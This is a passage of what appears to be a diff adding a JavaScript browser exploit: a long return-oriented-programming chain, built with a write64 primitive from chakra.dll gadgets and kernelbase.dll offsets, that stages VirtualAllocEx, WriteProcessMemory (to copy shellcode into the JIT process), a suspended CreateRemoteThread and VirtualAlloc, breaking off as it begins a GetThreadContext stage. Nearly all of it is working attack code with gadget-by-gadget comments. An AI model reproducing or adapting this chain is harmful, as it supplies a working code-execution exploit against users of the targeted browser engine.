+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
+    next();
+
+    // LPVOID lpAddress (RDX)
+    // Let VirtualAllocEx decide where the memory will be located
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x3c7b5, chakraHigh);       //  0x18003c7b5: pop rdx ; ret ;
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // NULL address (let VirtualAllocEx deside where we allocate memory in the JIT process)
+    next();
+
+    // HANDLE hProcess (RCX)
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x76b7, chakraHigh);       //  // 0x1800076b7 pop rcx; ret
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x74e030, chakraHigh);      // .data pointer from chakra.dll which will hold full perms handle to JIT server
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xfdad1, chakraHigh);       // 0x1800fdad1: mov rcx, qword [rcx] ; mov qword [rax+0x20], rcx ; ret ; (Place duplicated JIT handle into RCX)
+    next();                                                                     				   // Recall RAX already has a writable pointer in it
+
+    // Call KERNELBASE!VirtualAllocEx
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x3cec80, chakraHigh);      // 0x1803cec80: pop rax ; ret
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0xff00, kernelbaseHigh); // KERNELBASE!VirtualAllocEx address 
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x1266cd, chakraHigh);      // 0x1266cd: jmp rax (Call KERNELBASE!VirtualAllocEx)
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x58cdd0, chakraHigh);      // "return address" for KERNELBASE!VirtualAllocEx - 0x18058cdd0: add rsp, 0x38 ; ret
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // (shadow space for __fastcall as well)
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // (shadow space for __fastcall as well)
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // (shadow space for __fastcall as well)
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // (shadow space for __fastcall as well)         
+    next(); //is in its final state
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000004, 0x00000000);             // DWORD flProtect (RSP+0x28) (PAGE_READWRITE)
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38
+    next();
+
+    // WriteProcessMemory() ROP chain
+    // Stage 3 -> Write our shellcode into the JIT process
+
+    // Store the VirtualAllocEx return address in the .data section of kernelbase.dll (It is currently in RAX)
+
+    /*
+    0:015> dq kernelbase+0x216000+0x4000 L2
+    00007fff`58cfa000  00000000`00000000 00000000`00000000
+    */
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x4b1863, chakraHigh);       // 0x1804b1863: pop rcx ; ret ;
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x21a000, kernelbaseHigh); // .data section of kernelbase.dll where we will store VirtualAllocEx allocation
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x3bf711, chakraHigh);     // 0x1803bf711: mov qword [rcx], rax ; ret ; ret (Write the address for storage)
+    next();
+
+    // SIZE_T nSize (R9;)
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x57f835, chakraHigh);      // 0x18057f835: pop rax ; ret ;
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x72E128, chakraHigh);      // .data pointer from chakra.dll (ensures future cmp r8d, [rax] gadget writes to a valid pointer)
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x4b1863, chakraHigh);       // 0x1804b1863: pop rcx ; ret ;
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00001000, 0x00000000);             // SIZE_T nSize (0x1000)
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x18cb14, chakraHigh);      //DWORD 0x000000018018cb14:mov r9, rcx ; cmp r8d,  [rax] ; je 0x00000001800F6280 ; mov al, r10L ; add rsp, 0x28 ; ret 
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
+    next();
+
+    // HANDLE hProcess (RCX)
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x4b1863, chakraHigh);       //0x1804b1863: pop rcx ; ret ;
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x74e030, chakraHigh);      // .data pointer from chakra.dll which holds our full perms handle to JIT server
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xfdad1, chakraHigh);       //  0x1800fdad1: mov rcx, qword [rcx] ; mov qword [rax+0x20], rcx ; ret ; (Place duplicated JIT handle into RCX)
+    next();                                                                     // Recall RAX already has a writable pointer in it
+
+    // LPVOID lpBaseAddress (RDX)
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x3c7b5, chakraHigh);       // 0x18003c7b5: pop rdx ; ret ;
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x21a000-0x8, kernelbaseHigh); // .data section of kernelbase.dll where we have our VirtualAllocEx allocation
+    next();                                                                            // (-0x8 to compensate for below where we have to read from the address at +0x8 offset
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x259834, chakraHigh);      // 0x180259834: mov rdx, qword [rdx+0x08] ; mov rax, rdx ; ret ;mov rdx, qword [rdx+0x08] ; mov rax, rdx ; ret
+    next();
+
+    // LPCVOID lpBuffer (R8) (shellcode in chakra.dll .data section)
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x3a73cd, chakraHigh);         // 0x1803a73cd: pop r8 ; mov al, 0x01 ; ret ;
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x74b000, chakraHigh);    	  // .data section of chakra.dll holding our shellcode
+    next();
+
+    // Call KERNELBASE!WriteProcessMemory
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x57f835, chakraHigh);      // 0x18057f835: pop rax ; ret ;
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x79a40, kernelbaseHigh); // KERNELBASE!WriteProcessMemory address 
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x1266cd, chakraHigh);      // 0x1266cd: jmp rax (Call KERNELBASE!WriteProcessMemory)
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x58cdd0, chakraHigh);      // "return address" for KERNELBASE!WriteProcessMemory - 0x180243949: add rsp, 0x38 ; ret
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // (shadow space for __fastcall as well)
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // (shadow space for __fastcall as well)
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // (shadow space for __fastcall as well)
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // (shadow space for __fastcall as well)         
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // SIZE_T *lpNumberOfBytesWritten (NULL) (RSP+0x28)
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38
+    next();
+    // CreateRemoteThread() ROP chain
+    // Stage 4 -> Create a thread within the JIT process, but create it suspended
+    // This will allow the thread to _not_ execute until we are ready
+    // LPTHREAD_START_ROUTINE can be set to anything, as CFG will check it and we will end up setting RIP directly later
+    // We will eventually hijack RSP of this thread with a ROP chain, and by setting RIP to a return gadget our thread, when executed, will return into our ROP chain
+    // We will update the thread later via another ROP chain to call SetThreadContext()
+
+    // LPTHREAD_START_ROUTINE lpStartAddress (R9)
+    // This can be any random data, since it will never be executed
+
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x57f835, chakraHigh);      // 0x1800d43db: pop rax ; ret
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x74e030, chakraHigh);      // .data pointer from chakra.dll (ensures future cmp r8d, [rax] gadget writes to a valid pointer)
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x4b1863, chakraHigh);       // 0x180046377: pop rcx ; ret
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x28b4fe, chakraHigh);	   // 0x180043c63: Anything we want - this will never get executed
+    next();
+    // DWORD 0x000000018018cb14:mov r9, rcx ; cmp r8d,  [rax] ; je 0x00000001800F6280 ; mov al, r10L ; add rsp, 0x28 ; ret
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x18cb14, chakraHigh);        // 0x1800f6270: mov r9, rcx ; cmp r8d,  [rax] ; je 0x00000001800F6280 ; mov al, r10L ; add rsp, 0x28 ; ret
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
+    next();
+
+    // HANDLE hProcess (RCX)
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x4b1863, chakraHigh);       // 0x180046377: pop rcx ; ret
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x74e030, chakraHigh);      // .data pointer from chakra.dll which holds our full perms handle to JIT server
+    next();
+    // 0x1800fdad1: mov rcx, qword [rcx] ; mov qword [rax+0x20], rcx ; ret ; (Place duplicated JIT handle into RCX)
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xfdad1, chakraHigh);       // 0x1800d2125: mov rcx, qword [rcx] ; mov qword [rax+0x20], rcx ; ret (Place duplicated JIT handle into RCX)
+    next();
+    //0x18003c7b5: pop rdx ; ret
+    // LPSECURITY_ATTRIBUTES lpThreadAttributes (RDX)
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x3c7b5, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // NULL (default security properties)
+    next();
+    // 0x000000018037193d: pop r8; setne al; ret;
+    // SIZE_T dwStackSize (R8)
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x37193d, chakraHigh);      // 0x180576231: pop r8 ; ret
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // 0 (default stack size)
+    next();
+
+    // Call KERNELBASE!CreateRemoteThread
+    // 0x1800d43db: pop rax ; ret0x57f835,
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x57f835, chakraHigh);      // 0x180577fd4: pop rax ; ret
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0xdcfc0, kernelbaseHigh); // KERNELBASE!CreateRemoteThread
+    next();
+    // 0x1801266cd: jmp rax
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x1266cd, chakraHigh);      // 0x180272beb: jmp rax (Call KERNELBASE!CreateRemoteThread)
+    next();
+    //  "return address" for KERNELBASE!DuplicateHandle - 0x18058cdd0: add rsp, 0x38 ; ret
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x58cdd0, chakraHigh);      // "return address" for KERNELBASE!CreateRemoteThread - 0x180243949: add rsp, 0x38 ; ret
+    next(); 
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // LPVOID lpParameter (RSP+0x28)
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000004, 0x00000000);             // DWORD dwCreationFlags (RSP+0x30) (CREATE_SUSPENDED to avoid executing the thread routine)
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // LPDWORD lpThreadId (RSP+0x38)
+    next();
+
+    // WriteProcessMemory() ROP chain (Number 2)
+    // Stage 5 -> Update the final ROP chain, currently in the charka.dll .data section, with the address of our shellcode in the pop rcx gadget for lpAddress
+
+    // Before, we need to preserve the thread HANDLE returned by CreateRemoteThread
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x4b1863, chakraHigh);       // 0x180046377: pop rcx ; ret
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x21a100, kernelbaseHigh); // .data section of kernelbase.dll where we will store the thread HANDLE
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x3bf711, chakraHigh);       // 0x180313349: mov qword [rcx], rax ; ret (Write the address for storage)
+    next();
+
+    // SIZE_T nSize (R9)
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x41ec2a, chakraHigh);      // 0x180577fd4: pop rax ; ret
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x74e030, chakraHigh);      // .data pointer from chakra.dll (ensures future cmp r8d, [rax] gadget writes to a valid pointer)
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x4b1863, chakraHigh);       // 0x180046377: pop rcx ; ret
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000008, 0x00000000);             // SIZE_T nSize (0x8)
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x18cb14, chakraHigh);       // 0x1800f6270: mov r9, rcx ; cmp r8d,  [rax] ; je 0x00000001800F6280 ; mov al, r10L ; add rsp, 0x28 ; ret
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
+    next();
+
+    // HANDLE hProcess (RCX)
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x4b1863, chakraHigh);       // 0x180046377: pop rcx ; ret
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0xffffffff, 0xffffffff);             // Current process
+    next();
+
+    // LPVOID lpBaseAddress (RDX)
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x3c7b5, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x74b000+ropoffsetOne, chakraHigh); // .data section of chakra.dll where our final ROP chain is
+    next();                                                                       
+
+    // LPCVOID lpBuffer (R8) (Our kernelbase.dll .data section address which points to the value we want to write, the allocation of the VirtualAllocEx allocation)
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x37193d, chakraHigh);         // 0x180576231: pop r8 ; ret
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x21a000, kernelbaseHigh); // .data section of kernelbase.dll where the VirtualAllocEx allocation is stored
+    next();
+
+    // Call KERNELBASE!WriteProcessMemory 
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x41ec2a, chakraHigh);      // 0x180577fd4: pop rax ; ret
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x79a40, kernelbaseHigh); // KERNELBASE!WriteProcessMemory address 
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x1266cd, chakraHigh);      // 0x180272beb: jmp rax (Call KERNELBASE!WriteProcessMemory)
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x58cdd0, chakraHigh);      // "return address" for KERNELBASE!WriteProcessMemory - 0x180243949: add rsp, 0x38 ; ret
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)         
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // SIZE_T *lpNumberOfBytesWritten (NULL) (RSP+0x28)
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38
+    next();
+    // WriteProcessMemory() ROP chain (Number 3)
+    // Stage 6 -> Update the final ROP chain, currently in the charka.dll .data section, with the address of our shellcode in the pop rdi gadget for our "fake return address"
+
+    // SIZE_T nSize (R9)
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x41ec2a, chakraHigh);      // 0x180577fd4: pop rax ; ret
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x74B000, chakraHigh);      // .data pointer from chakra.dll (ensures future cmp r8d, [rax] gadget writes to a valid pointer)
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x4b1863, chakraHigh);       // 0x180046377: pop rcx ; ret
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000008, 0x00000000);             // SIZE_T nSize (0x8)
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x18cb14, chakraHigh);       // 0x1800f6270: mov r9, rcx ; cmp r8d,  [rax] ; je 0x00000001800F6280 ; mov al, r10L ; add rsp, 0x28 ; ret
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
+    next();
+
+    // HANDLE hProcess (RCX)
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x4b1863, chakraHigh);       // 0x180046377: pop rcx ; ret
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0xffffffff, 0xffffffff);             // Current process
+    next();
+
+    // LPVOID lpBaseAddress (RDX)
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x3c7b5, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x74b000+ropoffsetTwo, chakraHigh); // .data section of chakra.dll where our final ROP chain is
+    next();                                                                       
+
+    // LPCVOID lpBuffer (R8) (Our kernelbase.dll .data section address which points to the value we want to write, the allocation of the VirtualAllocEx allocation)
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x37193d, chakraHigh);         // 0x180576231: pop r8 ; ret
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x21a000, kernelbaseHigh); // .data section of kernelbase.dll where the VirtualAllocEx allocation is stored
+    next();
+
+    // Call KERNELBASE!WriteProcessMemory
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x41ec2a, chakraHigh);      // 0x180577fd4: pop rax ; ret
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x79a40, kernelbaseHigh); // KERNELBASE!WriteProcessMemory address 
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x1266cd, chakraHigh);      // 0x180272beb: jmp rax (Call KERNELBASE!WriteProcessMemory)
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x58cdd0, chakraHigh);      // "return address" for KERNELBASE!WriteProcessMemory - 0x180243949: add rsp, 0x38 ; ret
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)         
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // SIZE_T *lpNumberOfBytesWritten (NULL) (RSP+0x28)
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38
+    next();
+    // VirtualAlloc() ROP chain
+    // Stage 7 -> Allocate some local memory to store the CONTEXT structure from GetThreadContext
+
+    // DWORD flProtect (R9)
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x41ec2a, chakraHigh);      // 0x180577fd4: pop rax ; ret
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x74b000, chakraHigh);      // .data pointer from chakra.dll (ensures future cmp r8d, [rax] gadget writes to a valid pointer)
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x4b1863, chakraHigh);       // 0x180046377: pop rcx ; ret
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000004, 0x00000000);             // PAGE_READWRITE (0x4)
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x18cb14, chakraHigh);       // 0x1800f6270: mov r9, rcx ; cmp r8d,  [rax] ; je 0x00000001800F6280 ; mov al, r10L ; add rsp, 0x28 ; ret
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
+    next();
+
+    // LPVOID lpAddress (RCX)
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x4b1863, chakraHigh);       // 0x180046377: pop rcx ; ret
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // NULL (let VirtualAlloc() decide the address)
+    next();
+
+    // SIZE_T dwSize (RDX) (0x4d0 = sizeof(CONTEXT))
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x3c7b5, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x000004d0, 0x00000000);             // (0x4d0 bytes)
+    next();
+
+    // DWORD flAllocationType (R8) ( MEM_RESERVE | MEM_COMMIT = 0x3000)
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x37193d, chakraHigh);      // 0x180576231: pop r8 ; ret
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00003000, 0x00000000);             // MEM_RESERVE | MEM_COMMIT (0x3000)
+    next();
+
+    // Call KERNELBASE!VirtualAlloc
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x41ec2a, chakraHigh);      // 0x180577fd4: pop rax ; ret
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x5ac10, kernelbaseHigh); // KERNELBASE!VirtualAlloc address 
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x1266cd, chakraHigh);      // 0x180272beb: jmp rax (Call KERNELBASE!VirtualAlloc)
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x58cdd0, chakraHigh);      // "return address" for KERNELBASE!VirtualAlloc - 0x180243949: add rsp, 0x38 ; ret
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)         
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38     
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38        
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38        
+    next();
+
+    // GetThreadContext() ROP chain //CONTINUE HERE
+    // Stage 8 -> Dump the registers of our newly created thread within the JIT process to leak the stack
+
+    // First, let's store some needed offsets of our VirtualAlloc allocation, as well as the address itself, in the .data section of kernelbase.dll
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x4b1863, chakraHigh);       // 0x180046377: pop rcx ; ret
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x21a108, kernelbaseHigh); // .data section of kernelbase.dll where we will store the VirtualAlloc allocation
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x3bf711, chakraHigh);       // 0x180313349: mov qword [rcx], rax ; ret (Write the address for storage)
+    next();
+
+    // Save VirtualAlloc_allocation+0x30. This is the offset in our buffer (CONTEXT structure) that is ContextFlags
